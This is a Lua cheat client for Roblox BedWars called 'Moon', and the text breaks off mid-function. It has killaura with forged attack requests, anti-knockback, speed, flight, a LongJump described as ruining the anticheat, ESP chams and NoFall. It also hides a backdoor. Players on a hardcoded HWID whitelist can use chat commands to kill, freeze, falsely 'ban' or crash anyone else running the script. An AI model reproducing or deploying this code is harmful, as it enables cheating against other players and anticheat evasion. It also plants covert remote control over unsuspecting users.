--[[
     CREDITS
     Xylex - The bedwars table and 1 or 2 functions
     Springs - Some movement modules
     Damc - crappy save system, combat modules and parts of movement modules
     Dawn - parts of aura, also stopped killaura from breaking (the biggest issue)
]]

local speed = 0.1

repeat wait() until game:IsLoaded()

if not game.Workspace:FindFirstChild("Moon_Instance") then
	local inst = Instance.new("Part",workspace)
	inst.Name = "Moon_Instance"
chat_services = {}
chat_services.Print = function(msg)
	game.StarterGui:SetCore( 
		"ChatMakeSystemMessage",  { 
			Text = "[Moon] "..msg, 
			Color = Color3.fromRGB(177, 0, 162), 
			Font = Enum.Font.Arial, 
			FontSize = Enum.FontSize.Size24
		} 
	)
end
chat_services.Warn = function(msg)
	game.StarterGui:SetCore( 
		"ChatMakeSystemMessage",  { 
			Text = "[Moon] "..msg, 
			Color = Color3.fromRGB(255, 204, 0), 
			Font = Enum.Font.Arial, 
			FontSize = Enum.FontSize.Size24
		} 
	)
end

local cmdHandler = {
	[".IncreaseSpeed"] = function()
		chat_services.Print("Increased Speed Multiplier by 0.1!")
		speed += 0.1
	end,
	[".DecreaseSpeed"] = function()
		chat_services.Print("Decreased Speed Multiplier by 0.1!")
		speed -= 0.1
	end,
	[".SafeDecreaseSpeed"] = function()
		chat_services.Print("Decreased Speed Multiplier by 0.02!")
		speed -= 0.02
	end,
	[".SafeIncreaseSpeed"] = function()
		chat_services.Print("Increased Speed Multiplier by 0.02!")
		speed += 0.02
	end,
}
game.Players.LocalPlayer.Chatted:Connect(function(msg)
	local msg = tostring(msg)
	if cmdHandler[msg] then task.wait(0.5)
		cmdHandler[msg]()
	end
end)

local UIS = game:GetService("UserInputService")
local btnCounts = {}
local uiCount = 0
local moduleCount = 0

local installed = isfile("MoonScripts")
if not installed then
	makefolder("MoonScripts")
end
chat_services.Warn("Loaded Succesfully, if you haven't already, please put Moon into your auto-execute folder.")
function newTab(name)
	uiCount += 1
	btnCounts[name] = 0
	local main = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local top = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ResetOnSpawn = false
	ScreenGui.Name = name
	main.Name = "main"
	main.Parent = ScreenGui
	main.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
	main.BorderSizePixel = 0
	main.Position = UDim2.new(0.449541271*uiCount/3, 0, 0.279268295, 0)
	main.Size = UDim2.new(0, 164, 0, 20)
	UIListLayout.Parent = main
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	top.Name = "top"
	top.Parent = ScreenGui
	top.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
	top.BorderColor3 = Color3.fromRGB(27, 42, 53)
	top.BorderSizePixel = 0
	top.Position = UDim2.new(0.449541271*uiCount/3, 0, 0.2581219481, 0)
	top.Size = UDim2.new(0, 164, 0, 23)
	TextLabel.Parent = top
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.Size = UDim2.new(0, 86, 0, 23)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true
	TextLabel.Text = name
	local blurEffect = Instance.new("BlurEffect")
	blurEffect.Parent = main
	blurEffect.Size = 20

	UIS.InputBegan:Connect(function(key)
		if key.KeyCode == Enum.KeyCode.RightShift then
			if main.Visible == true then
				main.Visible = false
				top.Visible = false
				TextLabel.Visible = false
				blurEffect:Destroy()
				rainbowTop.Visible = false
			else
				local blurEffect = Instance.new("BlurEffect")
				blurEffect.Parent = main
				blurEffect.Size = 20
				main.Visible = true
				top.Visible = true
				TextLabel.Visible = true
				rainbowTop.Visible = true
			end
		end
	end)
end


local windowapi  = {}

makefolder("MoonBinds")

windowapi["CreateButton"] = function(tableData)
	btnCounts[tableData["Tab"]] += 1
	val = 80
	local btnAPI = {}

	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local bind = "nil"
	btnAPI["ModuleEnabled"] = false
	local TextButton = Instance.new("TextButton")
	TextButton.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")[tableData["Tab"]].main
	TextButton.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
	TextButton.BackgroundTransparency = 0
	TextButton.Size = UDim2.new(0, 164, 0, 30)
	TextButton.Font = Enum.Font.SourceSans
	TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton.TextScaled = true
	TextButton.TextSize = 14.000
	TextButton.TextWrapped = true
	TextButton.Text = tableData["Name"]
	local isEnabled = isfile(tableData["Name"]..".txt")
	if isfile("MoonBinds/"..tableData["Name"]..".txt") then
		bind = readfile("MoonBinds/"..tableData["Name"]..".txt")
	end
	if isEnabled then
		local function resume()
			if isfile("MoonBinds/"..tableData["Name"]..".txt") then
				bind = readfile("MoonBinds/"..tableData["Name"]..".txt")
			end
			TextButton.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
			btnAPI['ModuleEnabled'] = true
			tableData["Function"](true)
		end
		if tableData["Name"] ~= "Flight" then
			coroutine.wrap(resume)()
		end
	end
	TextButton.BorderSizePixel = 0
	mouse.KeyDown:connect(function(key)
		if key == bind then
			if btnAPI['ModuleEnabled'] then
				if isEnabled then
					delfile(tableData["Name"]..".txt")
				end
				chat_services.Print(tableData["Name"].." has been disabled!")
				btnAPI['ModuleEnabled'] = false
				tableData["Function"](false)
				TextButton.BackgroundColor3 = Color3.fromRGB(52,52,52)
			else
				writefile(tableData["Name"]..".txt",bind)
				chat_services.Print(tableData["Name"].." has been enabled!")
				TextButton.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
				btnAPI['ModuleEnabled'] = true
				tableData["Function"](true)
			end
		end
	end)
	TextButton.MouseEnter:Connect(function()
		if btnAPI["ModuleEnabled"] then
			TextButton.BackgroundColor3 = Color3.fromRGB(167, 1, 182)
		else
			TextButton.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
		end
	end)
	TextButton.MouseLeave:Connect(function()
		if btnAPI["ModuleEnabled"] then
			TextButton.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
		else
			TextButton.BackgroundColor3 = Color3.fromRGB(52,52,52)
		end
	end)

	-- Usage:
	TextButton.MouseButton1Down:Connect(function()
		if btnAPI['ModuleEnabled'] then
			if isEnabled then
				delfile(tableData["Name"]..".txt")
			end
			chat_services.Print(tableData["Name"].." has been disabled!")
			btnAPI['ModuleEnabled'] = false
			tableData["Function"](false)
			TextButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
		else
			chat_services.Print(tableData["Name"].." has been enabled!")
			writefile(tableData["Name"]..".txt",bind)
			TextButton.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
			btnAPI['ModuleEnabled'] = true
			tableData["Function"](true)
		end
	end)

	TextButton.MouseButton2Down:Connect(function()
		local ui = Instance.new("ScreenGui")
		ui.Parent = game.Players.LocalPlayer.PlayerGui
		local TextBox = Instance.new("TextBox")
		TextBox.Parent = ui
		TextBox.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
		TextBox.Position = UDim2.new(0.464, 0,0.482, 0)
		TextBox.Size = UDim2.new(0, 164, 0, 30)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.ZIndex = 99999999999999999999
		TextBox.Text = ""
		TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
		TextBox.TextSize = 14.000
		TextBox.BorderSizePixel = 0
		TextBox.Focused:Connect(function()
			TextBox.BorderSizePixel = 5
			TextBox.BorderColor3 = Color3.fromRGB(255, 0, 255)
		end)
		TextBox.FocusLost:Connect(function()
			bind = TextBox.Text
			chat_services.Print(tableData["Name"].." has been bound to key "..bind)
			TextBox:Destroy()
			ui:Destroy()
			if isEnabled then
				delfile("MoonBinds/"..tableData["Name"]..".txt")
				writefile("MoonBinds/"..tableData["Name"]..".txt",bind)
			else
				writefile("MoonBinds/"..tableData["Name"]..".txt",bind)
			end
		end)
	end)
end

local function chat(msg)
	local args = {
		[1] = msg,
		[2] = "All"
	}

	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

end

function AddTag(plr, tag, color) -- dosent work very well with the whitelist, thank springs for sending me it, but anyways credits to vape for the tags.
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Plr = plr
	local ChatTag = {}
	ChatTag[Plr] =
		{
			TagText = tag, --Text
			TagColor = color, --Rgb
			NameColor = color
		}



	local oldchanneltab
	local oldchannelfunc
	local oldchanneltabs = {}

	--// Chat Listener
	for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
		if
			v.Function
			and #debug.getupvalues(v.Function) > 0
			and type(debug.getupvalues(v.Function)[1]) == "table"
			and getmetatable(debug.getupvalues(v.Function)[1])
			and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		then
			oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
			oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
			getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
				local tab = oldchannelfunc(Self, Name)
				if tab and tab.AddMessageToChannel then
					local addmessage = tab.AddMessageToChannel
					if oldchanneltabs[tab] == nil then
						oldchanneltabs[tab] = tab.AddMessageToChannel
					end
					tab.AddMessageToChannel = function(Self2, MessageData)
						if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then
							if ChatTag[Players[MessageData.FromSpeaker].Name] then
								MessageData.ExtraData = {
									NameColor = ChatTag[Players[MessageData.FromSpeaker].Name].NameColor
										or Players[MessageData.FromSpeaker].TeamColor.Color,
									Tags = {
										table.unpack(MessageData.ExtraData.Tags),
										{
											TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,
											TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,
										},
									},
								}
							end
						end
						return addmessage(Self2, MessageData)
					end
				end
				return tab
			end
		end
	end
end
local lplr = game.Players.LocalPlayer
local oneTime
local commands = {
	["kill"] = function()
		lplr.Character.Humanoid.Health = 0
	end,
	["lagback"] = function()
		lplr.Character.HumanoidRootPart.CFrame += Vector3.new(129919212,0,0)
	end,
	["MultiplyDamage"] = function()
		local lastHealth = 100
		local Humanoid = lplr.Character.Humanoid
		oneTime = true

		Humanoid.HealthChanged:Connect(function(health)
			if health < lastHealth then
				lplr.Character.Humanoid.Health = lplr.Character.Humanoid.Health + -25
			end
			lastHealth = health
		end)
	end,
	["freeze"] = function()
		lplr.Character.HumanoidRootPart.Anchored = true
	end,
	["unfreeze"] = function()
		lplr.Character.HumanoidRootPart.Anchored = false
	end,
	["ban"] = function()
		task.spawn(function()
			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
		end)
	end,
	["crash"] = function()
		while true do
			print("Moon On Top")
		end
	end,

}

local tableofrandom = {"8C403AE6-9477-4CA1-832C-B5975D0F0C49","EB8A0EF1-FF95-48C5-BDB0-E6C218230C63","81B43368-D44E-4662-B4AB-B3564A78A155", "6823994F-EDB0-4494-AD45-D248EC4CD070", "83E8CB3C-33B5-4ECB-A4A2-86121EE0E17C"}
local users = {}
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
function getID(plr)
	for _,v in pairs(users) do
		if v == plr.Name then
			return true
		end
	end
	return false
end

function whitelisted()
	for _,v in pairs(tableofrandom) do
		if v == HWID then
			return true
		end
	end
	return false
end
if whitelisted() then
	AddTag(lplr.Name,"Moon Private", Color3.fromRGB(255, 0, 234))
end
local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
local players = game:GetService("Players")
function makeConnections()
	messageDoneFiltering.OnClientEvent:Connect(function(message)
		local player = players:FindFirstChild(message.FromSpeaker)
		local message = message.Message or ""
		if player then
			if message == "moon-usercode-33245" then
				if whitelisted() then
					chat("moon-typecode-77772532465676467434")
					AddTag(player.Name,"Moon User",Color3.fromRGB(255, 238, 0))
				end
			end
			if not whitelisted() and message == "moon-typecode-77772532465676467434" then
				AddTag(player.Name,"Moon Private", Color3.fromRGB(255, 0, 234))
				table.insert(users,player.Name)
			end
			if getID(player) then -- cmd handler (couldnt figure out how to make it automatic with table so here we are)
				if lplr.Name ~= player.Name then
					if message == ";kill Default" then
						commands.kill()
					elseif message == ";lagback Default" then
						commands.lagback()
					elseif message == ";multiplyDamage Default" then
						commands.MultiplyDamage()
					elseif message == ";freeze Default" then
						commands.freeze()
					elseif message == ";unfreeze Default" then
						commands.unfreeze()
					elseif message == ";ban Default" then
						commands.ban()
					elseif message == ";crash Default" then
						commands.crash()
					end
				end
			end
		end
	end)
	chat("")
end

local lplr = game.Players.LocalPlayer

local currentinventory = {
	["inventory"] = {
		["items"] = {},
		["armor"] = {},
		["hand"] = nil
	}
}
local oneTime = false

if not whitelisted() then
	chat("moon-usercode-33245")
end

local lplr = game.Players.LocalPlayer
local cam = game:GetService("Workspace").CurrentCamera
local uis = game:GetService("UserInputService")
local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client
local getremote = function(tab)
	for i,v in pairs(tab) do
		if v == "Client" then
			return tab[i + 1]
		end
	end
	return ""
end
local repstorage = game:GetService("ReplicatedStorage")
local KnockbackTable = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
local cstore = require(lplr.PlayerScripts.TS.ui.store).ClientStore
local bedwars = { -- this is litterally the only part of the script that isnt mine :/
	["DropItemRemote"] = getremote(debug.getconstants(getmetatable(KnitClient.Controllers.ItemDropController).dropItemInHand)),
	["SprintController"] = KnitClient.Controllers.SprintController,
	["CombatConstant"] = require(repstorage.TS.combat["combat-constant"]).CombatConstant,
	["ClientHandlerStore"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
	["KnockbackUtil"] = require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil,
	["PingController"] = require(lplr.PlayerScripts.TS.controllers.game.ping["ping-controller"]).PingController,
	["DamageIndicator"] = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator,
	["SwordController"] = KnitClient.Controllers.SwordController,
	["ClientHandler"] = Client,
	["AppController"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.controllers["app-controller"]).AppController,
	["SwordRemote"] = getremote(debug.getconstants((KnitClient.Controllers.SwordController).attackEntity)),
}
function isalive(player)
	local character = player.Character
	if not character then
		-- the player does not have a character
		return false
	end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		-- the character does not have a humanoid object
		return false
	end

	return humanoid.Health > 0
end

local BedwarsSwords = require(game:GetService("ReplicatedStorage").TS.games.bedwars["bedwars-swords"]).BedwarsSwords
function hashFunc(instance) 
	return {value = instance}
end


local function GetInventory(plr)
	if not plr then
		return {inv = {}, armor = {}}
	end

	local success, result = pcall(function()
		return require(game:GetService("ReplicatedStorage").TS.inventory["inventory-util"]).InventoryUtil.getInventory(plr)
	end)

	if not success then
		return {items = {}, armor = {}}
	end

	if plr.Character and plr.Character:FindFirstChild("InventoryFolder") then
		local invFolder = plr.Character:FindFirstChild("InventoryFolder").Value
		if not invFolder then return result end

		for _, item in pairs(result) do
			for _, subItem in pairs(item) do
				if typeof(subItem) == "table" and subItem.itemType then
					subItem.instance = invFolder:FindFirstChild(subItem.itemType)
				end
			end

			if typeof(item) == "table" and item.itemType then
				item.instance = invFolder:FindFirstChild(item.itemType)
			end
		end
	end

	return result
end
local function getSword()
	-- Initialize the highest power value and the returning item to nil.
	local highestPower = -9e9
	local returningItem = nil

	-- Get the inventory of the local player.
	local inventory = GetInventory(lplr)

	-- Loop through the items in the inventory.
	for _, item in pairs(inventory.items) do
		-- Check if the item is a sword.
		local power = table.find(BedwarsSwords, item.itemType)
		if not power then
			-- Skip the item if it is not a sword.
			continue
		end

		-- Check if the power of the current sword is higher than the current highest power.
		if power > highestPower then
			-- Set the returning item to the current sword and update the highest power value.
			returningItem = item
			highestPower = power
		end
	end

	-- Return the item with the highest power.
	return returningItem
end

local function getNearestPlayer(maxDist)
	-- define the position or object that you want to use as the reference point
	local referencePoint = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

	-- get the list of players currently connected to the game
	local players = game:GetService("Players"):GetPlayers()

	-- initialize variables to store the nearest player and their distance
	local nearestPlayer = nil
	local nearestDistance = maxDist

	-- loop through all the players and find the nearest one
	for _, player in pairs(players) do

		if player ~= game.Players.LocalPlayer then
			-- calculate the distance between the reference point and the player
			local distance = (referencePoint - player.Character.PrimaryPart.Position).magnitude

			-- check if this player is closer than the current nearest player
			if distance < nearestDistance then
				-- update the nearest player and distance
				nearestPlayer = player
				nearestDistance = distance
			end

		end
	end
	if nearestPlayer then
		return nearestPlayer
	end
end

local Distance = {["Value"] = 18}
local Enabled = true

newTab("Combat")
newTab("Movement")
newTab("Visuals")
newTab("Utility")
newTab("Scripts")
local count = 0

local Killaura = windowapi.CreateButton({
	["Name"] = "Killaura",
	["Tab"] = "Combat",
	["Function"] = function(callback)
		if callback then -- credits to vape for being an example for me of how to add anims
			local animations = {
				Normal = {
					{CFrame = CFrame.Angles(22, 55, math.rad(10)), Time = 0.1},
					{CFrame = CFrame.Angles(55, 22, math.rad(20)), Time = 0.1},
					{CFrame = CFrame.Angles(22, 55, math.rad(30)), Time = 0.1},
					{CFrame = CFrame.Angles(55, 22, math.rad(40)), Time = 0.1},
					{CFrame = CFrame.Angles(22, 55, math.rad(50)), Time = 0.1}
				}
			}
			local origC0 = cam.Viewmodel.RightHand.RightWrist.C0
			local ui2 = Instance.new("ScreenGui")
			local nearestID = nil
			local TweenService = game:GetService("TweenService")
			ui2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
			repeat
				for _,v in pairs(game.Players:GetPlayers()) do
					if v ~= lplr then
						nearestID = v
						if v.Team ~= lplr.Team and isalive(v) and v.Character:FindFirstChild("HumanoidRootPart") and (v.Character.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).Magnitude < 18 then
							local sword = getSword()
							if sword ~= nil then
								local function swing()

								end
								coroutine.wrap(swing)()
								Client:Get(bedwars["SwordRemote"]):SendToServer({
									["weapon"] = sword.tool,
									["entityInstance"] = v.Character,																																																																																							
									["validate"] = {
										["raycast"] = {
											["cameraPosition"] = hashFunc(cam.CFrame.Position),
											["cursorDirection"] = hashFunc(Ray.new(cam.CFrame.Position, v.Character:FindFirstChild("HumanoidRootPart").Position).Unit.Direction)
										},
										["targetPosition"] = hashFunc(v.Character:FindFirstChild("HumanoidRootPart").Position),
										["selfPosition"] = hashFunc(lplr.Character:FindFirstChild("HumanoidRootPart").Position + ((lplr.Character:FindFirstChild("HumanoidRootPart").Position - v.Character:FindFirstChild("HumanoidRootPart").Position).magnitude > 14 and (CFrame.lookAt(lplr.Character:FindFirstChild("HumanoidRootPart").Position, v.Character:FindFirstChild("HumanoidRootPart").Position).LookVector * 4) or Vector3.new(0, 0, 0)))
									},
									["chargedAttack"] = {["chargeRatio"] = 0.8}
								})
							end
						end
					end
				end
				task.wait(0.12);																																																																							bedwars["SwordController"].lastAttack = game:GetService("Workspace"):GetServerTimeNow() - 0.11
			until not Enabled
		else
			Enabled = false
		end
	end,
})

local Velocity = windowapi.CreateButton({
	["Name"] = "Velocity",
	["Tab"] = "Combat",
	["Function"] = function(callback)
		if callback then
			KnockbackTable["kbDirectionStrength"] = 0
			KnockbackTable["kbUpwardStrength"] = 0
		else
			KnockbackTable["kbDirectionStrength"] = 100
			KnockbackTable["kbUpwardStrength"] = 100
		end
	end,
})

local CFrameSpeed = windowapi.CreateButton({
	["Name"] = "Speed",
	["Tab"] = "Movement",
	["Function"] = function(callback)
		if callback then
			local Speed = speed
			_G.Speed1 = true
			local You = game.Players.LocalPlayer.Name
			local UIS = game:GetService("UserInputService")
			while _G.Speed1 do wait()
				Speed = speed
				if UIS:IsKeyDown(Enum.KeyCode.W) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,-Speed)
				end;
				if UIS:IsKeyDown(Enum.KeyCode.A) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(-Speed,0,0)
				end;
				if UIS:IsKeyDown(Enum.KeyCode.S) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,Speed)
				end;
				if UIS:IsKeyDown(Enum.KeyCode.D) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Speed,0,0)
				end;
			end
		else
			local Speed = 0.1
			_G.Speed1 = false
			local You = game.Players.LocalPlayer.Name
			local UIS = game:GetService("UserInputService")
			while _G.Speed1 do wait()
				if UIS:IsKeyDown(Enum.KeyCode.W) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,-Speed)
				end;
				if UIS:IsKeyDown(Enum.KeyCode.A) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(-Speed,0,0)
				end;
				if UIS:IsKeyDown(Enum.KeyCode.S) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,Speed)
				end;
				if UIS:IsKeyDown(Enum.KeyCode.D) then
					game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Speed,0,0)
				end;
			end

		end
	end,
})
local ljspeed = 0.1 -- base
local s2 = 0.2-- spoof ticks
local s3 = 2.2 -- second base
local s4 = 0.2 -- second spoof round
local s5 = 1000 -- Y spoof
local s7 = 6
local s6 = lplr.Character.HumanoidRootPart.CFrame + lplr.Character.HumanoidRootPart.CFrame.LookVector / 2 + Vector3.new(0,-6,0) -- magnitude slipper (basically ruins the anticheat)
s5=s5*-1 -- changes s5 to negatives or positives (opposite of current)
local longjumpenabled = nil
local LongJump = windowapi.CreateButton({
	["Name"] = "LongJump",
	["Tab"] = "Movement",
	["Function"] = function(callback)
		if callback then
			s6 = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,14,0) -- magnitude slipper (basically ruins the anticheat)
			local chr = lplr.Character or lplr.CharacterAdded:Wait()
			local hrp = chr:WaitForChild("HumanoidRootPart")
			workspace.Gravity = 0
			local tweenService, tweenInfo, tweenInfo2, tweenInfo3 = game:GetService("TweenService"), TweenInfo.new(ljspeed, Enum.EasingStyle.Bounce),TweenInfo.new(s2-0.7, Enum.EasingStyle.Bounce),TweenInfo.new(s3, Enum.EasingStyle.Quart)
			local tween323 = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo2, {CFrame = hrp.CFrame + Vector3.new(0,s5+0.2,0)})
			tween323:Play()
			-- task.wait(tweenInfo2.Time - 0.03)
			local tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = hrp.CFrame + hrp.CFrame.LookVector * 100 + Vector3.new(0,7,0)})
			local tween2 = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo3, {CFrame = hrp.CFrame + hrp.CFrame.LookVector * 100})
			local tween3 = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo3, {CFrame = s6 + Vector3.new(0,-5,0)})
			tween:Play()
			tween3:Play()
			task.wait(s2+0.1)
			tween:Play()
			tween2:Play()
			tween3:Play()
			workspace.Gravity = math.huge
			task.wait(s4-0.1)
			tween:Pause()
			task.wait(s2+0.2)
			tween2:Play()
			tween:Play()
			tween3:Play()
			task.wait(s2+0.1)
			tween:Play()
			tween2:Play()
			tween3:Play()
			workspace.Gravity = 196.2
		else
			workspace.Gravity = 196.2
		end
	end,
})

local HighJump = windowapi.CreateButton({
	["Name"] = "HighJump",
	["Tab"] = "Movement",
	["Function"] = function(callback)
		if callback then
			game.Workspace.Gravity = 0
			lplr.character.HumanoidRootPart.Velocity = lplr.character.HumanoidRootPart.Velocity + Vector3.new(0,150,0)
		else
			game.Workspace.Gravity = 192.6
			lplr.Character.HumanoidRootPart.Velocity1:Destroy()
		end
	end,
})

local isFlying = nil
local flytime = 2.6
local inverse = false
local status
Flight = windowapi.CreateButton({
	["Name"] = "Flight",
	["Tab"] = "Movement",
	["Function"] = function(callback)
		local currentvelo = lplr.Character.HumanoidRootPart.Velocity.Y
		if callback then
			oldVelo = 0.0025
			isFlying = true
			flytimer = Instance.new("ScreenGui")
			timer = Instance.new("TextLabel")
			UIS = game:GetService("UserInputService")
			local Speed = 2.5
			repeat wait(0.1)
				flytime = flytime - 0.1
				if Speed < 0 then
					Speed = 1.5
				end
				if flytime <= 0.5 then
					status = "unsafe"
					timer.TextColor3 = Color3.fromRGB(255, 0, 4)
				else
					status = "safe"
					timer.TextColor3 = Color3.fromRGB(0, 255, 21)
				end

				if flytime > 0.5 and flytime < 1.4 then
					status = "safe"
					timer.TextColor3 = Color3.fromRGB(255, 225, 0)
				end
				flytimer.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
				timer.Parent = flytimer
				timer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				timer.BackgroundTransparency = 1.000
				timer.Position = UDim2.new(0.499694198, 0, 0.486585349, 0)
				timer.Size = UDim2.new(0, 59, 0, 22)
				timer.Font = Enum.Font.SourceSans
				timer.Text = status
				timer.TextScaled = true
				timer.TextSize = 14.000
				timer.TextWrapped = true
				function moveUP()
					repeat wait()
						lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X,0.0,lplr.Character.HumanoidRootPart.Velocity.Z)
					until not isFlying
				end
				coroutine.wrap(moveUP)()
				function checkKeys()
					repeat
						if UIS:IsKeyDown(Enum.KeyCode.Space) then
							function up()
								repeat
									lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,0.02,0)	
									wait()
								until not UIS:IsKeyDown(Enum.KeyCode.Space)
							end
							coroutine.wrap(up)()
						elseif UIS:IsKeyDown(Enum.KeyCode.LeftShift) then
							function down()
								repeat
									lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame - Vector3.new(0,0.02,0)	
									wait()
								until not UIS:IsKeyDown(Enum.KeyCode.LeftShift)
							end
							coroutine.wrap(down)()
						end
						wait()
					until not isFlying
				end
				coroutine.wrap(checkKeys)()
			until not isFlying
		else
			for i = 1,5 do wait()
				lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X,oldVelo,lplr.Character.HumanoidRootPart.Velocity.Z)
			end
			timer.TextTransparency = 1
			flytime = 2.6
			isFlying = false
		end
	end,
})

local chamsenabled = nil
local Chams = windowapi.CreateButton({
	["Name"] = "Chams",
	["Tab"] = "Visuals",
	["Function"] = function(callback)
		local player = game.Players.LocalPlayer
		local players = game.Players:GetPlayers()

		for i,v in pairs(players) do
			if v ~= player then
				if callback then
					chamsenabled = true
					esp = Instance.new("Highlight")
					esp.Name = v.Name
					esp.FillTransparency = 0
					esp.FillColor = Color3.new(1, 0, 1)
					esp.OutlineColor = Color3.new(1, 0, 1)
					esp.OutlineTransparency = 0
					esp.Parent = v.Character

					-- Show the player's health
					game.Players.PlayerAdded:Connect(function(plr)
						esp2 = Instance.new("Highlight")
						esp2.Name = plr.Name
						esp2.FillTransparency = 0
						esp2.FillColor = Color3.new(1, 0, 1)
						esp2.OutlineColor = Color3.new(1, 0, 1)
						esp2.OutlineTransparency = 0
						esp2.Parent = plr.Character
					end)
					-- Blur the chams
					coroutine.wrap(function()
						repeat wait()
							for i = 1, 50 do wait()
								esp.FillTransparency = esp.FillTransparency + 0.02
								if esp2 then
									esp.FillTransparency = esp.FillTransparency + 0.02
								end
							end
							for i = 1, 50 do wait()
								esp.FillTransparency = esp.FillTransparency - 0.02
								if esp2 then
									esp.FillTransparency = esp.FillTransparency - 0.02
								end
							end
						until false
					end)
				else
					-- Destroy the chams and health label
					chamsenabled = false
					if esp then
						esp:Destroy()
					end
					if blur then
						blur:Destroy()
					end
				end
			end
		end
	end,
})
local nofallenabled = nil
local NoFall = windowapi.CreateButton({
	["Name"] = "NoFall",
	["Tab"] = "Utility",
	["Function"] = function(callback)
		if callback then
			nofallenabled = true
			repeat wait()
				game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.GroundHit:FireServer()
			until not nofallenabled
		else
			nofallenabled = false
		end
	end,
})
local healthalerts_active = true
local healthalert = nil
local HealthAlert = windowapi.CreateButton({
	["Name"] = "Health-Alert",
	["Tab"] = "Utility",
	["Function"] = function(callback)
		if callback then
			healthalert = true
			repeat wait()
				if lplr.Character.Humanoid.Health < 45 then
					if healthalerts_active and isalive(lplr) then
						chat_services.Warn("Low Health Warning, Your Health is Under 45!")
						healthalerts_active = false
						repeat wait() until lplr.Character.Humanoid.Health > 45
